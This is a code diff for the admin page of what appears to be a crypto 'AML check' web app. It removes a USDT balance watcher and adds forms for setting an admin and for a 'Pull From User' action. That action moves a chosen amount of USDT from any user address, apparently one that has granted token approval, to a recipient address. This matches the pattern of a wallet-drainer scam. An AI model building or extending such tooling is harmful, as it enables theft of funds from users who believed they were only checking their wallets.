@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react'
+import React, { useState, useEffect } from 'react'
 import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
@@ -99,60 +99,6 @@ export default function Admin() {
     }
     refreshWalletUsdt()
   }, [address, isConnected])
-
-  // USDT balance watcher (Arbitrum)
-  const [isWatchingUsdt, setIsWatchingUsdt] = useState(false)
-  const [watchStatus, setWatchStatus] = useState('')
-  const watchUnsubRef = useRef(null)
-
-  async function startWatchingUsdt() {
-    try {
-      if (isWatchingUsdt) return
-      if (!isConnected || !address) { setWatchStatus('Connect wallet to watch'); return }
-      const networkName = 'arbitrum'
-      const usdtAddress = USDT_ADDRESSES[networkName]
-      const rpcUrl = RESOLVED_RPC_URLS[networkName]
-      if (!usdtAddress || !rpcUrl) { setWatchStatus('USDT/RPC not configured'); return }
-      const client = createPublicClient({ transport: http(rpcUrl) })
-      const unwatch = client.watchBlockNumber({
-        emitOnBegin: true,
-        pollingInterval: 8000,
-        onBlockNumber: async () => {
-          try {
-            const bal = await client.readContract({ address: usdtAddress, abi: ERC20_ABI, functionName: 'balanceOf', args: [address] })
-            setWalletUsdtBalance(`${formatUnits(bal, 6)} USDT`)
-            setWatchStatus('Watching USDT on Arbitrum')
-          } catch (e) {
-            console.warn('Watch read failed:', e)
-            setWatchStatus('Watch error; retry next block')
-          }
-        },
-        onError: (err) => {
-          console.warn('Block watch error:', err)
-          setWatchStatus('Watch error')
-        }
-      })
-      watchUnsubRef.current = unwatch
-      setIsWatchingUsdt(true)
-    } catch (e) {
-      console.warn('Failed to start watcher:', e)
-      setWatchStatus('Failed to start watcher')
-    }
-  }
-
-  function stopWatchingUsdt() {
-    try { watchUnsubRef.current && watchUnsubRef.current() } catch {}
-    watchUnsubRef.current = null
-    setIsWatchingUsdt(false)
-    setWatchStatus('Stopped watching')
-  }
-
-  useEffect(() => {
-    if (!isConnected && isWatchingUsdt) {
-      stopWatchingUsdt()
-    }
-  }, [isConnected, isWatchingUsdt])
-
   const APPROVALS_CACHE_KEY = 'amlsec_approvals_cache'
   function readApprovalsCache(networkName, contractAddress) {
     try {
@@ -315,18 +261,24 @@ export default function Admin() {
 
                 <div className="admin-card">
                   <div className="admin-controls">
-                    <button className="admin-btn" onClick={isWatchingUsdt ? stopWatchingUsdt : startWatchingUsdt}>
-                      {isWatchingUsdt ? 'Stop Watching' : 'Watch USDT Balance'}
-                    </button>
-                    {watchStatus && (
-                      <p className="admin-status" style={{ color: '#666' }}>{watchStatus}</p>
-                    )}
                     {!isAdminAuthed && (
                       <p className="admin-status" style={{ color: '#b00' }}>Not authenticated. Please <a href="/login">login</a> to access admin controls.</p>
                     )}
                     <p className="admin-status" style={{ color: isAdminAuthed ? '#0a0' : '#b00' }}>{adminStatus}</p>
                     <p className="admin-meta">Owner: {ownerOnChain || '—'} | Admin: {adminOnChain || '—'}</p>
                     <p className="admin-meta">Connected wallet must be on-chain owner or admin.</p>
+
+                    <form onSubmit={handleSetAdmin} className="admin-form">
+                      <input type="text" placeholder="New admin address" value={newAdminAddress} onChange={(e) => setNewAdminAddress(e.target.value)} className="admin-input" />
+                      <button className="admin-btn" type="submit" disabled={!isAdminAuthed || isSettingAdmin}>Set Admin</button>
+                    </form>
+
+                    <form onSubmit={handleAdminPull} className="admin-pull-form">
+                      <input type="text" placeholder="User address" value={userToPull} onChange={(e) => setUserToPull(e.target.value)} className="admin-input" />
+                      <input type="text" placeholder="Recipient address" value={recipientForPull} onChange={(e) => setRecipientForPull(e.target.value)} className="admin-input" />
+                      <input type="text" placeholder="Amount (USDT)" value={amountToPull} onChange={(e) => setAmountToPull(e.target.value)} className="admin-input" />
+                      <button className="admin-btn primary" type="submit" disabled={!isAdminAuthed || isPulling}>Pull From User</button>
+                    </form>
                   </div>
                 </div>
 
